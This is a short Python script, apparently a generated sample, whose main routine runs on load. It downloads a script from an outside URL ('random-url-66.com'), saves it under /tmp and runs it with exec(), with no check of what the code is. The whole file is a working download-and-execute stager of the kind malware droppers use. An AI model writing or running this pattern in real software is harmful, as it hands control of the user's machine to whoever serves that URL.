import requests
import os

class CodeHandler:
    def __init__(self, url, filepath):
        self.url = url
        self.filepath = filepath

    def download_code(self):
        response = requests.get(self.url)
        return response.text

    def save_code(self, code):
        with open(self.filepath, "w") as f:
            f.write(code)

    def load_code(self):
        with open(self.filepath, "r") as f:
            return f.read()

    def run_code(self, code):
        try:
            exec(code)
        except Exception as e:
            print(e)

def main():
    random_url = "http://random-url-66.com/script.py"
    local_file = "/tmp/script66.py"

    code_handler = CodeHandler(random_url, local_file)
    downloaded_code = code_handler.download_code()
    code_handler.save_code(downloaded_code)

    code_to_run = code_handler.load_code()
    code_handler.run_code(code_to_run)

main()
